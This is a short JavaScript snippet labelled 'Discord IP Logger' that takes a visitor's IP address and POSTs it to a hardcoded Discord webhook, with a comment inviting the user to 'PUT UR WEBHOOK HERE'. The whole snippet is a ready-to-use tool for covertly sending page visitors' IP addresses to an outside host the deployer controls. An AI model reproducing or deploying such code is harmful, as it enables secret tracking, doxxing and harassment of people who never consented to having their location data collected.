function getIP(json) {
  var request = new XMLHttpRequest();
        const Hook = "https://discord.com/api/webhooks/982640726233989160/eocrq8nA_BHqWXffOAD37-beOIBhIezexSGpPCSuNTLpPns0H_L0EoE0dNzXrPbCzGEe"; // PUT UR WEBHOOK HERE
        var request = new XMLHttpRequest();
        request.open("POST", Hook);
        request.setRequestHeader('Content-type', 'application/json');
        var params = {
            username: "Discord IP Logger",
            embeds: [
                { "color": 7506394,
                "title": "IP Logged",
                "description": json.ip
            }]
        }
        request.send(JSON.stringify(params));
    }
